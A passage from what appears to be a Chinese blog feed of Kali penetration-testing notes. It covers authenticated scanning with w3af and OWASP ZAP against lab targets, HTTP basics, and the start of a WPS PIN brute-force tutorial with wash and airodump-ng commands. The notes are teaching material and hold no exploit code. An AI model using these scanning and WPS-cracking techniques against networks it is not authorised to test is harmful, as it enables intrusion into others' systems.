src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129101727343.png" alt="image-20230129101727343"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129101800239.png" alt="image-20230129101800239"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129101831997.png" alt="image-20230129101831997"></p><ul><li>选择（text&#x2F;html）的包右键打开追踪TCP流查看详细信息</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129102023746.png" alt="image-20230129102023746"></p><blockquote><p>其中客户端通过<code>Authorization: Basic YWRtaW5pc3RyYXRvcjpwYXNzd29yZA==</code>这个头信息发送给服务端；可以看出来基本身份认证是使用Base64编码</p></blockquote><ul><li>使用在线加解密工具解码</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129102626165.png" alt="image-20230129102626165"></p><h5 id="使用w3af进行基本身份认证扫描"><a href="#使用w3af进行基本身份认证扫描" class="headerlink" title="使用w3af进行基本身份认证扫描"></a>使用w3af进行基本身份认证扫描</h5><ul><li><p>配置scan信息</p><ul><li>配置<code>http-settings</code>设置基本身份认证方式</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129103639377.png" alt="image-20230129103639377"></p></li></ul><blockquote><p>其中<code>basic_auth_domain</code>若是域名访问就填写域名，若是IP访问就写IP</p></blockquote><ul><li>配置插件</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129104006134.png" alt="image-20230129104006134"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129104048233.png" alt="image-20230129104048233"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129104444249.png" alt="image-20230129104444249"></p><ul><li>开始扫描</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129104552565.png" alt="image-20230129104552565"></p><blockquote><p>其中扫描出是IIS服务器还有很多URL扫描</p></blockquote><ul><li>抓包查看</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129105109524.png" alt="image-20230129105109524"></p><blockquote><p>其中UA头是w3af特征表示，扫描时需要修改特征</p></blockquote><h5 id="使用w3af进行NTLM身份认证扫描"><a href="#使用w3af进行NTLM身份认证扫描" class="headerlink" title="使用w3af进行NTLM身份认证扫描"></a>使用w3af进行NTLM身份认证扫描</h5><blockquote><p>NTLM微软专有的身份认证方式，相比较基本认证方式安全性很高</p><p>NTLM基于随机数，双方通过随机数各自用各自的密码进行加密，一方能够解密另一方的密码，说明双方的密码是一样的；客户端向服务器发起访问请求的时候会先提交一个随机数，服务器端会用自己的密码把随机加密，加密之后将密文回传给客户端，客户端再用自己的密码把密文解密，查看拿到的随机数与自己发送的随机是否一样，若相同则是相同的密码。<strong>在此过程中传输的是随机数，不会将明文或者密文进行传输。</strong></p></blockquote><ul><li>选择“集成Windows身份认证”</li></ul><blockquote><p>集成Windows身份认证就是NTLM身份认证</p></blockquote><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129110642203.png" alt="image-20230129110642203"></p><ul><li>配置w3af</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129110927410.png" alt="image-20230129110927410"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129111045332.png" alt="image-20230129111045332"></p><ul><li>开始扫描</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129111119796.png" alt="image-20230129111119796"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129115939669.png" alt="image-20230129115939669"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129115923133.png" alt="image-20230129115923133"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129120106787.png" alt="image-20230129120106787"></p><blockquote><p>抓包过程中看到是NTLM认证方式，不知道什么原因实验过程中设置为NTLM身份认证方式后，输入正确的用户名和密码都是拒绝访问；抓包图中也是报401的错误，正常情况是可以抓到200的OK包；但是具体流程如上。</p></blockquote><h5 id="基于From表单的身份认证"><a href="#基于From表单的身份认证" class="headerlink" title="基于From表单的身份认证"></a>基于From表单的身份认证</h5><ul><li><p>实验环境</p><ul><li>DVWA</li></ul></li><li><p>使用w3af的插件auth—&gt;detailed进行表单身份认证</p><ul><li>填写身份认证配置信息</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129121752893.png" alt="image-20230129121752893"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129123458123.png" alt="image-20230129123458123"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129123113711.png" alt="image-20230129123113711"></p><blockquote><p>check_string字段：选择登录页面之后特有的字段</p><p>data_format字段：数据格式；通过Post请求发送的数据内容，上图中抓取的Post包中<code>username=admin&amp;password=password&amp;Login=Login</code>字段，也可以将此字段直接添加到data_format中；<strong>其中默认的变量%u&#x3D;%U：u表示username_field，U表示username值；后面p参数同理。</strong></p></blockquote></li><li><p>配置爬网插件信息</p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129130034289.png" alt="image-20230129130034289"></p><blockquote><p>勾选only_forward表示只会扫描指定子目录，其中在<code>Target</code>中需加入目录名称；follow_regex默认<code>*</code>表示扫描所有文件，也可自定义扫描<code>jsp/php</code>；ignore_regex表示忽略掉某些文件不去扫描</p></blockquote></li><li><p>开始扫描</p></li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129130604618.png" alt="image-20230129130604618"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129130847571.png" alt="image-20230129130847571"></p><blockquote><p>从扫描的日志可以看到已经成功的进行了身份认证后的扫描</p></blockquote><h5 id="基于Cookie的身份认证方式"><a href="#基于Cookie的身份认证方式" class="headerlink" title="基于Cookie的身份认证方式"></a>基于Cookie的身份认证方式</h5><blockquote><p>双因素身份认证，即使输入正确表单内容也无法正常登录，需要配合Cookie进行身份认证。</p></blockquote><ul><li>配置Cookie文件</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129134157494.png" alt="image-20230129134157494"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129133443350.png" alt="image-20230129133443350"></p><blockquote><p>cookie文件必须严格按照w3af要求的格式，必须使用<code>Tab</code>制表符，不能使用空格；</p><p>每一行必须存放一个cookie信息，每一个字段中间使用Tab键来分开</p><ol><li>填写域名或者IP</li><li>flag标志位：TRUE&#x2F;FALSE，在这个域中所有的机器是否都可以访问这个变量，TRUE可以，FALSE不可以</li><li>path：路径</li><li>flag标志位：安全相关的flag，是否需要安全的连接才能够访问响应的变量</li><li>时间值：时间信息，表示cookie是否过期，这个值必须很大，值远远超过当前时间</li><li>名称</li><li>值</li></ol><p><strong>必须严格按照合适编辑cookie文件，否则无法使用</strong></p></blockquote><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129134459328.png" alt="image-20230129134459328"></p><blockquote><p>如果保存成功了表示cookie文件格式没有问题，若是不成功会报错</p></blockquote><ul><li>开始扫描</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129134733870.png" alt="image-20230129134733870"></p><blockquote><p>可以看到已经成功使用cookie身份认证方式进行扫描</p></blockquote><h3 id="Arachni"><a href="#Arachni" class="headerlink" title="Arachni"></a>Arachni</h3><blockquote><p>官网下载地址：</p><p><a href="https://www.arachni-scanner.com/download/">https://www.arachni-scanner.com/download/</a></p><p>安装及使用：<br><a href="https://blog.csdn.net/weixin_39776817/article/details/113230898">https://blog.csdn.net/weixin_39776817/article/details/113230898</a></p></blockquote><h3 id="OWASP-ZAP"><a href="#OWASP-ZAP" class="headerlink" title="OWASP_ZAP"></a>OWASP_ZAP</h3><blockquote><ul><li>Zed attack proxy</li><li>WEB Application集成渗透测试和漏洞挖掘工具</li><li>开源免费跨平台简单易用</li></ul></blockquote><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129194453897.png" alt="image-20230129194453897"></p><blockquote><ol><li>持久保存会话内容，默认文件夹</li><li>持久保存会话内容，自定义路径</li><li>不保存会话内容</li></ol></blockquote><h4 id="截断代理"><a href="#截断代理" class="headerlink" title="截断代理"></a>截断代理</h4><ul><li>配置OWASP_ZAP代理</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129195209581.png" alt="image-20230129195209581"></p><blockquote><p>接着在浏览器将OWASP_ZAP证书的导入配置本地8080端口监听即可</p></blockquote><ul><li>使用截断代理</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129201846768.png" alt="image-20230129201846768"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129202005765.png" alt="image-20230129202005765"></p><blockquote><p>访问过的所有网站都可以被截取到OWASP_ZAP中；使用此功能可以进行手动爬网，点击网站中任何功能点都被OWASP_ZAP记录，利于之后进行分析</p></blockquote><ul><li>安装插件</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129202903559.png" alt="image-20230129202903559"></p><h5 id="被动扫描"><a href="#被动扫描" class="headerlink" title="被动扫描"></a>被动扫描</h5><ul><li>警报功能</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129203250958.png" alt="image-20230129203250958"></p><blockquote><p>基于被动扫描，会通过警报提示可能存在的漏洞</p></blockquote><h5 id="主动扫描"><a href="#主动扫描" class="headerlink" title="主动扫描"></a>主动扫描</h5><ul><li>两种扫描方法</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129203517636.png" alt="image-20230129203517636"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129203610727.png" alt="image-20230129203610727"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129203708657.png" alt="image-20230129203708657"></p><blockquote><p>也可通过左栏访问过的网站地址右键进行攻击</p></blockquote><ul><li><p>Fuzzer</p><ul><li>工具—&gt;Fuzz</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129204158655.png" alt="image-20230129204158655"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129204214995.png" alt="image-20230129204214995"></p></li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129204249915.png" alt="image-20230129204249915"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129204405463.png" alt="image-20230129204405463"></p><blockquote><p>Fuzzer可以自定义的需要Fuzz的字符或者也可以添加一个文件</p><p>打开Fuzz的方法为以上两种</p></blockquote><h5 id="OWASP-ZAP—API"><a href="#OWASP-ZAP—API" class="headerlink" title="OWASP_ZAP—API"></a>OWASP_ZAP—API</h5><blockquote><p>自己开发扫描工具可以调用OWASP_ZAP的API</p><p>官方文档：<br><a href="http://zap/">http://zap/</a> （需要挂外网）</p></blockquote><h4 id="OWASP-ZAP基本功能"><a href="#OWASP-ZAP基本功能" class="headerlink" title="OWASP_ZAP基本功能"></a>OWASP_ZAP基本功能</h4><h5 id="Scan-Mode"><a href="#Scan-Mode" class="headerlink" title="Scan Mode"></a>Scan Mode</h5><blockquote><ul><li>Scan Mode——Safe̵（安全模式）Protected̵（保护模式）Standard̵（标准模式）ATTACK （攻击模式）<ul><li>从左到右扫描攻击性逐渐增强</li></ul></li></ul></blockquote><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129211852828.png" alt="image-20230129211852828"></p><h5 id="Scan-policy（扫描策略）"><a href="#Scan-policy（扫描策略）" class="headerlink" title="Scan policy（扫描策略）"></a>Scan policy（扫描策略）</h5><blockquote><p>配置扫描策略</p></blockquote><ul><li>选择站点—&gt;右键—&gt;攻击—&gt;主动攻击</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129212426132.png" alt="image-20230129212426132"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129212457151.png" alt="image-20230129212457151"></p><blockquote><p>集成的默认策略</p></blockquote><ul><li>自定义扫描策略</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129212616307.png" alt="image-20230129212616307"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129213017273.png" alt="image-20230129213017273"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129213135755.png" alt="image-20230129213135755"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129213338414.png" alt="image-20230129213338414"></p><h5 id="Anti-CSRF-Tokens"><a href="#Anti-CSRF-Tokens" class="headerlink" title="Anti CSRF Tokens"></a>Anti CSRF Tokens</h5><ul><li>添加不同的CSRF Token</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129213747954.png" alt="image-20230129213747954"></p><h5 id="Scope"><a href="#Scope" class="headerlink" title="Scope"></a>Scope</h5><blockquote><p>凡是在Scope中的都可以使用同一个策略进行扫描；由于每次访问网站都会被记录，而使用Scope则可以快速筛选出要进行扫描要进行审计的目标站点，过滤掉不需要的信息</p></blockquote><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129214521238.png" alt="image-20230129214521238"></p><h5 id="Http-Sessions"><a href="#Http-Sessions" class="headerlink" title="Http Sessions"></a>Http Sessions</h5><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129215030315.png" alt="image-20230129215030315"></p><blockquote><p>手动身份认证：客户端访问目标站点后返回给客户端Session，OWASP_ZAP会自动记录由服务器端返回给客户端的Session，后续由OWASP_ZAP发起扫描请求时会自动使用记录的Session进行扫描（所谓手动就是通过浏览器手动输入用户名密码生成Session的过程）</p><p><strong>当手动身份认证不适用的时候，可以使用表单或NTLM等其他身份认证方式</strong></p></blockquote><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129220625103.png" alt="image-20230129220625103"></p><blockquote><p>当有多个用户Session的话，OWASP_ZAP可以很方便的进行切换，不需要手动输入Session&#x2F;Cookie</p></blockquote><h5 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h5><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129221228802.png" alt="image-20230129221228802"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129221238177.png" alt="image-20230129221238177"></p>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-Web渗透【HTTP】</title>
      <link href="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90HTTP%E3%80%91/"/>
      <url>/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90HTTP%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="WEB攻击面"><a href="#WEB攻击面" class="headerlink" title="WEB攻击面"></a>WEB攻击面</h2><blockquote><ul><li><p>Network </p></li><li><p>OS</p></li><li><p>WEB Server </p></li><li><p>App server </p></li><li><p>Web Application </p></li><li><p>Database </p></li><li><p>Browser</p></li></ul></blockquote><h2 id="HTTP协议基础"><a href="#HTTP协议基础" class="headerlink" title="HTTP协议基础"></a>HTTP协议基础</h2><blockquote><ul><li>明文<ul><li>无内建的机密性安全机制</li><li>嗅探或代理截断可查看全部明文信息</li><li>https只能提高传出层安全</li></ul></li><li>无状态<ul><li>每一次客户端和服务器端的通信都是独立的过程</li><li>WEB应用需要跟踪客户端会话（多步通信）</li><li>不使用cookie的应用，客户端每次请求都要重新身份验证（不现实）</li><li>Session用于在用户身份验证后跟踪用户行为轨迹<ul><li>提高用户体验，但增加了攻击向量</li></ul></li></ul></li><li>Cycle（请求响应）<ul><li>一个请求 &#x2F; 一个响应</li></ul></li><li>重要的header<ul><li>Set-Cookie：服务器发给客户端的SessionID（被窃取的风险）</li><li>Content-Length：响应body部分的字节长度<ul><li>Fuzz或者暴力破解查看Content-Length字段</li></ul></li><li>Location：重定向用户到另一个页面，可识别身份认证后允许访问的页面</li><li>Cookie：客户端发回给服务器证明用户状态的信息（头：值成对出现）</li><li>Referrer：发起请求之前用户位于哪个页面，服务器基于此头的安全限制很容易修改绕过</li></ul></li></ul></blockquote><h2 id="HTTP协议状态码"><a href="#HTTP协议状态码" class="headerlink" title="HTTP协议状态码"></a>HTTP协议状态码</h2><blockquote><ul><li><p>服务端响应的状态码表示响应的结果类型（5大类50多个具体响应码）</p></li><li><p>100s：服务器响应的信息，通常表示服务器还有后续处理，很少出现</p></li><li><p>200s：请求被服务器成功接收并处理后返回的响应结果</p></li><li><p>300s：重定向，通常在身份认证成功后重定向到安全页面（301&#x2F;302）</p></li><li><p>400s：表示客户端请求错误</p><ul><li>401：需要身份验证</li><li>403：拒绝访问</li><li>404：目标未发现</li></ul></li><li><p>500s：服务器内部错误（503：服务不可用）</p></li></ul><p>http协议状态码详解：</p><p><a href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html">http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-WPS攻击及黑客攻击方式</title>
      <link href="/2023/01/25/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPS%E6%94%BB%E5%87%BB/"/>
      <url>/2023/01/25/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPS%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="WPS-WIRELESS-PROTECTED-SETUP）"><a href="#WPS-WIRELESS-PROTECTED-SETUP）" class="headerlink" title="WPS (WIRELESS PROTECTED SETUP）"></a>WPS (WIRELESS PROTECTED SETUP）</h2><blockquote><ul><li><p>WPS是WiFi联盟2006年开放的一项技术</p><ul><li><p>通过PIN码来简化无线接入的操作，无需记住PSK</p></li><li><p>路由器和网卡各按一个按钮就能接入无线</p></li><li><p>PIN码是分为前后各4位的2段共8位数字</p></li></ul></li><li><p>安全漏洞</p><ul><li><p>2011年被发现安全涉及漏洞</p></li><li><p>接入发起方可以根据路由器的返回信息判断前4位是否正确</p></li><li><p>而PIN码的后4位只有1000中定义的组合(最后一位是checksum)</p></li><li><p>所以全部穷举破解只需要11000次尝试</p><ul><li>若采用8位的PSK（包含数字，大小写字母等），破解次数最高可达218,340,105,584,896次</li></ul></li></ul></li><li><p>获得PIN后，可直接请求获取PSK</p></li><li><p>标准本身没有设计锁定机制，目前多个厂商已实现锁定机制（限制失败连接的尝试次数）</p></li><li><p>包括Linksys在内的很多厂家的无线路由器无法关闭WPS功能</p></li><li><p>即使在WEB节目中有关闭WPS，配置也不会生效</p></li><li><p>攻击难度相对较低，防御却十分困难</p></li><li><p>一般可在4-10小时爆破密码</p><ul><li>PSK</li></ul></li><li><p>用计算器直接算出PIN（早期部分厂商的PIN码是AP MAC的前三字节（转10进制））</p><ul><li>如：C83A35——13122101，00B00C——00045068</li></ul></li></ul></blockquote><h2 id="WPS-攻击"><a href="#WPS-攻击" class="headerlink" title="WPS 攻击"></a>WPS 攻击</h2><ul><li><p>启动侦听模式后，扫描支持WPS的AP</p><ul><li><p><code>wash -F -i wlan0mon</code></p><blockquote><p>-F：忽略错误帧的告警信息；-i：指定从那个网卡侦听</p></blockquote><p><img src="/2023/01/25/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPS%E6%94%BB%E5%87%BB/image-20230125085727187.png" alt="image-20230125085727187"></p></li><li><p><code>airodump-ng wlan0 --wps</code>   # 